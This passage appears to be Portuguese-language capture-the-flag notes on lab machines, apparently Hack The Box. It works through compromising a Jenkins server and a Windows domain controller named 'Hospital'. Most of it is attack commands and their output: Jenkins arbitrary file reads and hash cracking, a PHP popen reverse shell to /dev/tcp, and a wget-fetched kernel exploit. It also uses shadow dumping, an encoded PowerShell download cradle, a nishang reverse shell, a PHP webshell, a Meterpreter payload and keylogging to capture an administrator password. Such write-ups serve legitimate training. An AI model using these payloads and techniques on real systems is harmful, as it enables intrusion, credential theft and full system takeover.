    amra_5955286986173787020 users.xml
    ```
    
    Parece que temos um diretório para o usuário que criamos, juntamente com uma string aleatória anexada ao nome de utilizador. Vamos ler o conteúdo de `users.xml`.
    
    ```bash
    jenkins@63cea5c8dd6e:~$ cat users/users.xml
    <?xml version='1.1' encoding='UTF-8'?>
    <hudson.model.UserIdMapper>
    <version>1</version>
    <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
    <string>amra</string>
    <string>amra_5955286986173787020</string>
    </entry>
    </idToDirectoryNameMap>
    ```
    
    O conteúdo do ficheiro revela o nome da diretoria do nosso utilizador. Olhando para dentro do diretório, encontramos um ficheiro chamado `config.xml` com o hash da nossa palavra-passe.
    
    ```bash
    jenkins@63cea5c8dd6e:~$ cat users/amra_5955286986173787020/config.xml
    <?xml version='1.1' encoding='UTF-8'?>
    <SNIP>
    <passwordHash>#jbcrypt:$2a$10$EoPv/Um7bNwmUPUpTuqr5.2YAsbZzlBNVMp2q/rfRjjBkpNnWs7
    l.</passwordHash>
    <SNIP>
    </properties>
    ```
    
    Então, encontramos uma maneira válida de extrair hashes de senha e nomes de usuário de uma instalação do Jenkins.
    Vamos tentar isso no servidor remoto usando a opção de leitura de arquivo arbitrário.
    
    ```bash
    java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080'
    help "@/var/jenkins_home/users/users.xml"
    Feb 08, 2024 8:28:02 AM hudson.cli.CLI _main
    INFO: Skipping HTTPS certificate checks altogether. Note that this is not secure
    at all.
    ERROR: Too many arguments: <hudson.model.UserIdMapper>
    ```
    
    Parece que o ficheiro também existe no servidor remoto, mas utilizando o comando help só conseguimos extrair as duas primeiras linhas do ficheiro. Olhando para outros comandos disponíveis para o `jenkins-cli`, descobrimos que podemos ler o arquivo inteiro usando o comando connect-node.
    
    ```bash
    java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080'
    connect-node "@/var/jenkins_home/users/users.xml"
    <?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1'
    encoding='UTF-8'?>" exists.
    <string>jennifer_12108429903186576833</string>: No such agent "
    <string>jennifer_12108429903186576833</string>" exists.
    <SNIP>
    ```
    
    Temos o nome de utilizador jennifer e o caminho completo do diretório `jennifer_12108429903186576833`.
    Vamos pegar o hash desse usuário:
    
    ```bash
    java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080'
    connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
    <SNIP>
    <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l
    1a</passwordHash>" exists.
    ```
    
    We save the hash in a file and use john to crack it and get a clear text password.
    
    ```bash
    john hash -w=/usr/share/wordlists/rockyou.txt
    princess
    ```
    
    Utilizando as credenciais `jennifer:princess`, podemos iniciar sessão na instância remota do Jenkins.
    
    - Privilege Escalation 1
        
        Depois de identificarmos a existência do objeto de credencial SSH, clicamos no botão de atualização.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2057.png)
        
        Em seguida, utilizando as Ferramentas de Desenvolvimento do nosso browser e inspecionando o campo Oculto por Confidencialidade, podemos obter a chave SSH encriptada.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2058.png)
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2059.png)
        
        Copiando esse valor, navegamos para [http://10.129.230.220:8080/script](http://10.129.230.220:8080/script) e usamos o seguinte script para decrypt a chave SSH.
        
    - Privilege Escalation 2
        
        Observando o ambiente do Jenkins, notamos que há uma credencial armazenada no Jenkins, com o nome `root`.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2060.png)
        
        Esta credencial é uma chave SSH. Além disso, olhando para os plugins, vemos que temos o plugin SSH Agent instalado.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2061.png)
        
        Isso significa que podemos criar um pipeline e executar comandos usando SSH. Vamos verificar se a chave SSH é válida para a máquina host, como o usuário root.
        Em primeiro lugar, criamos um novo item do Pipeline.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2062.png)
        
        Depois, na secção do script do Pipeline, usamos o seguinte comando para ler a chave SSH para o utilizador root.
        
        ```bash
        pipeline {
        agent any
        stages {
        stage('SSH') {
        steps {
        script {
        sshagent(credentials: ['1']) {
        sh 'ssh -o StrictHostKeyChecking=no root@10.129.230.220
        "cat /root/.ssh/id_rsa"'
        }
        }
        }
        }
        }
        }
        
        ```
        
        Em seguida, clicamos em Save e, finalmente, em Build Now . Olhando para a saída da consola da compilação, podemos obter a chave SSH, guardá-la num ficheiro e utilizar o SSH para nos ligarmos à máquina anfitriã como utilizador raiz.
        
- php desabled functions
    - Windows machine
        
        Enumeration
        
        ```bash
        nmap -T4 -sC -sV -p- 10.129.229.189
        Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-22 14:16 BST
        Nmap scan report for 10.129.229.189
        Host is up (0.031s latency).
        Not shown: 65508 filtered tcp ports (no-response)
        PORT     STATE SERVICE           VERSION
        53/tcp   open  domain            Simple DNS Plus
        88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-22 20:18:18Z)
        135/tcp  open  msrpc             Microsoft Windows RPC
        139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
        389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
        | ssl-cert: Subject: commonName=DC
        | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
        | Not valid before: 2023-09-06T10:49:03
        |_Not valid after:  2028-09-06T10:49:03
        443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
        | ssl-cert: Subject: commonName=localhost
        | Not valid before: 2009-11-10T23:48:47
        |_Not valid after:  2019-11-08T23:48:47
        |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
        | tls-alpn: 
        |_  http/1.1
        |_ssl-date: TLS randomness does not represent time
        |_http-title: Hospital Webmail :: Welcome to Hospital Webmail
        445/tcp  open  microsoft-ds?
        464/tcp  open  kpasswd5?
        593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
        636/tcp  open  ldapssl?
        | ssl-cert: Subject: commonName=DC
        | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
        | Not valid before: 2023-09-06T10:49:03
        |_Not valid after:  2028-09-06T10:49:03
        1801/tcp open  msmq?
        2103/tcp open  msrpc             Microsoft Windows RPC
        2105/tcp open  msrpc             Microsoft Windows RPC
        2107/tcp open  msrpc             Microsoft Windows RPC
        2179/tcp open  vmrdp?
        3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
        | ssl-cert: Subject: commonName=DC
        | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
        | Not valid before: 2023-09-06T10:49:03
        |_Not valid after:  2028-09-06T10:49:03
        3269/tcp open  globalcatLDAPssl?
        | ssl-cert: Subject: commonName=DC
        | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
        | Not valid before: 2023-09-06T10:49:03
        |_Not valid after:  2028-09-06T10:49:03
        3389/tcp open  ms-wbt-server     Microsoft Terminal Services
        | ssl-cert: Subject: commonName=DC.hospital.htb
        | Not valid before: 2024-04-21T20:15:05
        |_Not valid after:  2024-10-21T20:15:05
        | rdp-ntlm-info: 
        |   Target_Name: HOSPITAL
        |   NetBIOS_Domain_Name: HOSPITAL
        |   NetBIOS_Computer_Name: DC
        |   DNS_Domain_Name: hospital.htb
        |   DNS_Computer_Name: DC.hospital.htb
        |   DNS_Tree_Name: hospital.htb
        |   Product_Version: 10.0.17763
        |_  System_Time: 2024-04-22T20:19:06+00:00
        5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        6404/tcp open  msrpc             Microsoft Windows RPC
        6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
        6407/tcp open  msrpc             Microsoft Windows RPC
        6410/tcp open  msrpc             Microsoft Windows RPC
        6616/tcp open  msrpc             Microsoft Windows RPC
        6634/tcp open  msrpc             Microsoft Windows RPC
        6644/tcp open  msrpc             Microsoft Windows RPC
        9389/tcp open  mc-nmf            .NET Message Framing
        Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
        
        Host script results:
        | smb2-security-mode: 
        |   311: 
        |_    Message signing enabled and required
        | smb2-time: 
        |   date: 2024-04-22T20:19:07
        |_  start_date: N/A
        |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
        
        ```
        
        Vemos que existem muitas portas abertas e que há uma AD para explorar.
        
        Ao enumerar a porta 8080
        
        ```bash
        gobuster dir -u http://10.129.229.189:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
        ===============================================================
        Gobuster v3.1.0
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://10.129.229.189:8080
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.1.0
        [+] Extensions:              php
        [+] Timeout:                 10s
        ===============================================================
        2024/04/22 14:41:22 Starting gobuster in directory enumeration mode
        ===============================================================
        /index.php            (Status: 302) [Size: 0] [--> login.php]
        /images               (Status: 301) [Size: 324] [--> http://10.129.229.189:8080/images/]
        /login.php            (Status: 200) [Size: 5739]                                        
        /register.php         (Status: 200) [Size: 5125]                                        
        /uploads              (Status: 301) [Size: 325] [--> http://10.129.229.189:8080/uploads/]
        /upload.php           (Status: 200) [Size: 0]                                            
        /css                  (Status: 301) [Size: 321] [--> http://10.129.229.189:8080/css/]    
        /js                   (Status: 301) [Size: 320] [--> http://10.129.229.189:8080/js/]     
        /logout.php           (Status: 302) [Size: 0] [--> login.php]                            
        /success.php          (Status: 200) [Size: 3536]                                         
        /vendor               (Status: 301) [Size: 324] [--> http://10.129.229.189:8080/vendor/] 
        /config.php           (Status: 200) [Size: 0]                                            
        /fonts                (Status: 301) [Size: 323] [--> http://10.129.229.189:8080/fonts/]  
        /server-status        (Status: 403) [Size: 281]                                          
        /failed.php           (Status: 200) [Size: 3508]             
        ```
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2063.png)
        
        Vemos ques existe um login na pagina. E também podemos nos registar neste site. Na pagina de registo podemos fazer enumeração do utilizadores do site porque ao tentar criar o utilizador admin não é possível porque já existe. 
        
        Ao criar um utilizador vemos que existe uma pagina de upload. Tentamos fazer upload de um ficheiro `php` mas não é permitido. Mas existe um ficheiro que ele faz upload que é a extensão `phar`.
        
        Tentamos fazer upload de um ficheiro phar com código php para identificar as informações que podemos obter sobre a versão php intalada no servidor. 
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2064.png)
        
        Vemos que existem muitas funções desativadas em php 
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2065.png)
        
        Vamos criar um código php para testar outro tipo de funções que nos possam dar acesso ao servidor.
        
        ```bash
        <?php
        $dangerous_functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail');
        
        foreach ($dangerous_functions as $f) {
        	if(function_exists($f)){
        		echo $f . "exists<br>\n";
        	}
        }
        
        ?>
        ```
        
        Codigo php para testar as funções. Em baixo as funções que são permitidas
        
        ```bash
        error_log exists
        popen exists
        link exists
        symlink exists
        syslog exists
        mail exists
        ```
        
        Para fazermos isto temos que primeiro fazer o upload da função.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2066.png)
        
        Depois aceder ao ficheiro.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2067.png)
        
        Agora vamos utilizar uma função que utiliza a função `popen` que executa código. Esta função lista a diretoria.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2068.png)
        
        ```bash
        <?php
        error_reporting(E_ALL);
        
        /* Add redirection so we can get stderr. */
        $handle = popen('/bin/ls 2>&1', 'r');
        echo "'$handle'; " . gettype($handle) . "\n";
        $read = fread($handle, 2096);
        echo $read;
        pclose($handle);
        ?>
        ```
        
        Como foi bem sucedido colocamos uma reverse shell.
        
        ```bash
        <?php
        error_reporting(E_ALL);
        
        /* Add redirection so we can get stderr. */
        $handle = popen('bash -c "bash -i >& /dev/tcp/10.10.14.65/1234 0>&1"', 'r');
        echo "'$handle'; " . gettype($handle) . "\n";
        $read = fread($handle, 2096);
        echo $read;
        pclose($handle);
        ?>
        
        ```
        
        Assim obtemos acesso ao servidor. Ao enumerar o servidor vemos que o sistema tem um kernel exploit.
        
        `www-data@webserver:/var/www/html$ uname -a`
        `Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
        
        [https://github.com/Notselwyn/CVE-2024-1086](https://github.com/Notselwyn/CVE-2024-1086)
        
        Este exploit tem um executável e ele ao fazer o download para a nossa e depois para o servidor. Executado vemos que nos da acesso root. 
        
        ```bash
        www-data@webserver:/var/www/html$ wget http://10.10.14.65:8000/exploit
        --2024-04-22 21:30:23--  http://10.10.14.65:8000/exploit
        Connecting to 10.10.14.65:8000... connected.
        HTTP request sent, awaiting response... 200 OK
        Length: 169360 (165K) [application/octet-stream]
        Saving to: ‘exploit’
        
        exploit                                           0%[                                                              exploit                                         100%[=====================================================================================================>] 165.39K  --.-KB/s    in 0.03s   
        
        2024-04-22 21:30:23 (5.89 MB/s) - ‘exploit’ saved [169360/169360]
        
        www-data@webserver:/var/www/html$ chmod 777 exploit 
        www-data@webserver:/var/www/html$ ./exploit 
        [*] creating user namespace (CLONE_NEWUSER)...
        [*] creating network namespace (CLONE_NEWNET)...
        [*] setting up UID namespace...
        [*] configuring localhost in namespace...
        [*] setting up nftables...
        [+] running normal privesc
        [*] waiting for the calm before the storm...
        [*] sending double free buffer packet...
        [*] spraying 16000 pte's...
        [*] checking 16000 sprayed pte's for overlap...
        [+] confirmed double alloc PMD/PTE
        [+] found possible physical kernel base: 0000000042c00000
        [+] verified modprobe_path/usermodehelper_path: 0000000044c8b980 ('/sanitycheck')...
        [*] overwriting path with PIDs in range 0->65536...
        /bin/sh: 0: can't access tty; job control turned off
        # ls
        bin  boot  dev	etc  home  lib	lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  sys  tmp  usr  var
        # cd /roo	
        /bin/sh: 2: cd: can't cd to /roo
        # cd /root
        # ls
        kernel	snap
        # cd ..
        # ls
        bin  boot  dev	etc  home  lib	lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  sys  tmp  usr  var
        # cd /home
        # ls
        drwilliams
        # cd drwilliams
        # ls
        go
        # ls -la
        total 32
        drwxr-x--- 5 drwilliams drwilliams 4096 Oct 29 01:42 .
        drwxr-xr-x 3 root       root       4096 Oct 29 02:02 ..
        lrwxrwxrwx 1 root       root          9 Oct 26 18:14 .bash_history -> /dev/null
        -rw-r--r-- 1 drwilliams drwilliams  220 Jan  7  2023 .bash_logout
        -rw-r--r-- 1 drwilliams drwilliams 3771 Jan  7  2023 .bashrc
        drwx------ 3 drwilliams drwilliams 4096 Sep 14  2023 .cache
        -rw-r--r-- 1 drwilliams drwilliams  807 Jan  7  2023 .profile
        drwx------ 2 drwilliams drwilliams 4096 Sep 12  2023 .ssh
        drwxrwxr-x 3 drwilliams drwilliams 4096 Sep 14  2023 go
        # id
        uid=0(root) gid=0(root) groups=0(root)
        # cat /etc/shadow | grep '\$'  
        root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
        drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
        ```
        
        Como temos acesso root conseguimos extrair as hash para cracker.
        
        `john users.txt -w=/usr/share/wordlists/rockyou.txt` 
        
        Credenciais
        
        `drwilliams:qwe123!@#` 
        
        Vamos testar se temos acesso smb á maquina e se conseguimos enumerar as shares.
        
        ```bash
        └──╼ [★]$ crackmapexec smb 10.129.229.189 -u drwilliams -p 'qwe123!@#' --shares
        SMB         10.129.229.189  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
        SMB         10.129.229.189  445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
        SMB         10.129.229.189  445    DC               [+] Enumerated shares
        SMB         10.129.229.189  445    DC               Share           Permissions     Remark
        SMB         10.129.229.189  445    DC               -----           -----------     ------
        SMB         10.129.229.189  445    DC               ADMIN$                          Remote Admin
        SMB         10.129.229.189  445    DC               C$                              Default share
        SMB         10.129.229.189  445    DC               IPC$            READ            Remote IPC
        SMB         10.129.229.189  445    DC               NETLOGON        READ            Logon server share 
        SMB         10.129.229.189  445    DC               SYSVOL          READ            Logon server share 
        ```
        
        As credenciais do drwilliams consegue entrar na pagina do roundcube.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2069.png)
        
        Ao pesquisar na internet vemos que exist uma vulnerabilidade do `ghostscrip esp` 
        
        [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
        
        Com este codigo conseguimos criar um ficheiro `esp`, enviamos por email e e depois esperamos que faça um pedido ao webserver que vamos colocar. Copiamos um codigo powershell para nos dar acesso.
        
         `cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1`
        
        o ficheir shell.ps1 contem o seguinte conteudo.
        
        `$client = New-Object System.Net.Sockets.TCPClient("10.10.14.65",9002);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
        
        ```bash
        ┌─[eu-dedivip-2]─[10.10.14.65]─[paulinho13@htb-2othxmxmd9]─[~/Desktop/CVE-2023-36664-Ghostscript-command-injection]
        └──╼ [★]$ echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.65:8000/shell.ps1')" | iconv -t UTF-16LE| base64 -w 0
        SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYANQA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
        ```
        
        Depois fazemos 
        
        `python3 CVE_2023_36664_exploit.py --generate --payload "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYANQA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=" --filename shell -x eps`
        [+] Generated EPS payload file: shell.eps
        
        Fazemos um codigo em powershell para fazer os download do ficheiro `shell.ps1` . Para assim obtermos uma shell.
        
        Mandamos este ficheiro gerado por email. 
        
        └──╼ [★]$ python3 -m http.server
        Serving HTTP on 0.0.0.0 port 8000 ([http://0.0.0.0:8000/](http://0.0.0.0:8000/)) ...
        10.129.229.189 - - [22/Apr/2024 15:57:44] "GET /shell.ps1 HTTP/1.1" 200 -
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2070.png)
        
        Assim obtemos uma shell com a conta do `drwilliams`
        
        PrivEsc
        
        - Método 1
            
            Como o servidor tem um serviço web na maquina, criamos um ficheiro php na maquina e assim podermos obter acesso com outro utilizador. 
            
            `PS C:\xampp\htdocs> echo "<?php system('whoami'); ?>" >shell.php`
            
            Não conseguimos escrever desta forma no ficheiro, alguma coisa a ver com a encodificação.
            
            `echo "<?php system(_REQUEST['cmd']); ?>" | Out-File -Encoding UTF8 shell.php`
            
            ```bash
            C:\xampp> icacls htdocs
            htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            BUILTIN\Users:(I)(CI)(AD)
            BUILTIN\Users:(I)(CI)(WD)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
            Successfully processed 1 files; Failed processing 0 files
            
            ```
            
            É evidente que tanto a conta SYSTEM como o grupo Administrators têm controlo total sobre o diretório e o seu conteúdo. Entretanto, o grupo Users tem permissões de leitura e execução no diretório e nos seus objectos filhos, juntamente com permissões de acrescentar dados e escrever dados especificamente no próprio diretório. Esta configuração incorrecta pode permitir-nos colocar um script PHP neste diretório e executá-lo através de um navegador Web, levando potencialmente à aquisição de uma shell privilegiada como Administrador.
            Começamos por criar um script para executar o comando whoami, usando PHP .
            
            Assim já conseguimos execução de codigo por isso vamos ao website e 
            
            `https://10.129.229.189/shell.php?cmd=powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgA1ACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA==` 
            
            Utilizamos o mesmo metodo anterior em que encodificamos em base64 o pedido ao nossa maquina e assim obtemos acesso  root á maquina.
            
        - Método 2
            
            Para uma melhor enumeração do sistema, vamos atualizar a nossa shell Netcat para uma sessão Meterpreter Meterpreter. Começaremos por gerar um payload Meterpreter, no mesmo diretório que o nc64.exe .
            
            `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4433 -f exe > shell.exe`
            
            De seguida, iniciamos um ouvinte `Meterpreter` dentro do `Metasploit` :
            
            ```bash
            msfconsole
            <...SNIP...>
            msf6 > use exploit/multi/handler
            [*] Using configured payload generic/shell_reverse_tcp
            msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
            payload => windows/x64/meterpreter/reverse_tcp
            msf6 exploit(multi/handler) > set lhost 10.10.14.14
            lhost => 10.10.14.14
            msf6 exploit(multi/handler) > set lport 4433
            lport => 4433
            msf6 exploit(multi/handler) > run
            [*] Started reverse TCP handler on 10.10.14.14:4433
            ```
            
            De seguida, vamos buscar o executável no anfitrião Windows utilizando o comando copy para copiar o payload shell.exe da partilha SMB localizada em `\\10.10.14.14\smbFolder\` para o ambiente de trabalho do utilizador `drbrown.HOSPITAL` .
            
            `C:\> copy \\10.10.14.14\smbFolder\shell.exe`
            `C:\Users\drbrown.HOSPITAL\Desktop\shell.exe`
            
            Finalmente, vamos executar o nosso payload, executando o executável:
            
            `C:\> C:\Users\drbrown.HOSPITAL\Desktop\shell.exe`
            
            Recebemos uma ligação no nosso ouvinte do `meterpreter`.
            
            ```bash
             msf6 exploit(multi/handler) > run
            [*] Started reverse TCP handler on 10.10.14.14:4433
            [*] Sending stage (200774 bytes) to 10.10.11.241
            [*] Meterpreter session 1 opened (10.10.14.14:4433 -> 10.10.11.241:6299) at 2024-
            04-06 16:58:51 -0400
            meterpreter > sysinfo
            Computer : DC
            OS : Windows 2016+ (10.0 Build 17763).
            Architecture : x64
            System Language : en_US
            Meterpreter : x64/windows
            ```
            
            Prosseguimos para enumerar o sistema.
            Entramos no cmd executando shell . Em seguida, executando o comando qwinsta, que exibe utilizadores com sessão iniciada interactivamente, observamos que existe uma sessão ativa.
            
            ```bash
            meterpreter > shell
            Process 3080 created.
            Channel 2 created.
            Microsoft Windows [Version 10.0.17763.4974]
            (c) 2018 Microsoft Corporation. All rights reserved.
            C:\Users\drbrown.HOSPITAL\Documents>qwinsta
            SESSIONNAME USERNAME ID STATE TYPE DEVICE
            >services 0 Disc
            console drbrown 1 Active
            rdp-tcp 65536 Listen
            ```
            
            Após uma investigação mais aprofundada dos processos em execução, observamos que o Internet Explorer ( `iexplore.exe` ) está atualmente em execução.
            
            ```bash
            meterpreter > ps
            Process List
            ============
            PID PPID Name Arch Session User Path
            --- ---- ---- ---- ------- ---- ----
            <...SNIP...>
            1576 664 svchost.exe
            1628 3928 iexplore.exe x64 1 HOSPITAL\drbrown C:\Program
            Files\internet explorer\iexplore.exe
            1636 664 svchost.exe
            <...SNIP...>
            ```
            
            Visto que existe uma sessão ativa e que o iexplore.exe está em execução, indicando que o utilizador está está a utilizar um browser, podemos tentar executar um keylogger e ver que resultados interessantes obtemos resultados interessantes.
            Para o fazer, temos primeiro de migrar para o processo iexplore.exe de 64 bits ( x64 ) - neste caso, o PID 1628.
            
            ```bash
            meterpreter > migrate 1628
            [*] Migrating from 1512 to 1628...
            [*] Migration completed successfully.
            ```
            
            `meterpreter > keyscan_start`
            
            ```bash
            meterpreter > keyscan_dump
            Dumping captured keystrokes...
            Administrator<Tab>Th3B3stH0sp1t4l9786!<CR>
            meterpreter > keyscan_stop
            Stopping the keystroke sniffer...
            ```
            
            Vemos que capturámos uma potencial palavra-passe de administrador de `Th3B3stH0sp1t4l9786!` , que podemos confirmar usando o netexec.
            
            ```bash
            netexec smb 10.10.11.241 -u Administrator -p 'Th3B3stH0sp1t4l9786!'
            SMB 10.10.11.241 445 DC [*] Windows 10.0 Build 17763
            x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
            SMB 10.10.11.241 445 DC [+]
            hospital.htb\Administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
            ```
            
            ```bash
            evil-winrm -u Administrator -p 'Th3B3stH0sp1t4l9786!' -i 10.10.11.241
            Evil-WinRM shell v3.4
            Warning: Remote path completions is disabled due to ruby limitation:
            quoting_detection_proc() function is unimplemented on this machine
            Data: For more information, check Evil-WinRM Github:
            https://github.com/Hackplayers/evil-winrm#Remote-path-completion
            Info: Establishing connection to remote endpoint
            *Evil-WinRM* PS C:\Users\Administrator\Documents>
            ```
            
    - Linux Machine
        
        Enumeration
        
